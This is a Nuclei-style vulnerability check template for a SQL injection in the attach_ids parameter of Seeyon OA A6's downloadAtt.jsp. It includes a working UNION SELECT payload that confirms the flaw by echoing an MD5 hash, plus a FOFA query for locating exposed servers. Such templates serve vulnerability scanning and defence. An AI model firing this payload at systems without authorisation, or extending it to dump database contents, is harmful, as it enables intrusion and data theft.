id: seeyon-downloadatt-sqli

info:
  name: 致远 OA downloadAtt.jsp SQL 注入
  author: Rexus
  severity: high
  description: |
    致远 OA A6 downloadAtt.jsp attach_ids 参数存在 SQL 注入，可获取数据库敏感信息。
  reference:
    - https://bugs.shuimugan.com/bug/view?bug_no=0108235
  metadata:
    max-request: 1
    fofa-query: app="致远互联-OA"
  tags: seeyon,sqli

variables:
  rand: '{{rand_int(200000000, 210000000)}}'

http:
  - method: GET
    path:
      - '{{BaseURL}}/yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=(1)%20and%201=2%20union%20select%201,2,3,4,5,md5({{rand}}),7--'

    matchers:
      - type: word
        part: body
        words:
          - '{{md5(rand)}}'
